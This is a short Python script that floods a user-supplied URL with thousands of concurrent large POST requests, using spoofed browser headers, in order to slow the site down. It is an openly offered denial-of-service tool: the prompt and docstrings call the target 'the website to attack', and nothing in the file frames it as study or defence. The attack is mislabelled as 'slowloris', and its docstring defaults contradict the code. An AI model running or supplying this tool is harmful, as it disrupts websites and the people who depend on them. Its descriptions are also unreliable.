import requests
import time
import concurrent.futures

def send_packet(url, packet_size=16000):
    """
    Send a single large packet to the given website.

    Args:
        url (str): URL of the website to attack
        packet_size (int): Size of the packet in bytes
    """
    packet = 'A' * packet_size
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Connection': 'keep-alive'
    }

    try:
        response = requests.post(url, headers=headers, data=packet)
        print(f'Sent packet to {url}')
    except requests.exceptions.RequestException as e:
        print(f'Error sending packet: {e}')

def slowloris_attack(url, packet_size=16000, num_packets=9999):
    """
    Send large packets to a given website to slow it down using concurrent requests.

    Args:
        url (str): URL of the website to attack
        packet_size (int): Size of each packet in bytes (default: 1024)
        num_packets (int): Number of packets to send (default: 100)
    """
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(send_packet, url, packet_size) for _ in range(num_packets)]
        
        for future in concurrent.futures.as_completed(futures):
            future.result()  # Wait for the result to complete

if __name__ == '__main__':
    url = input('Enter the URL of the website to attack: ')
    slowloris_attack(url)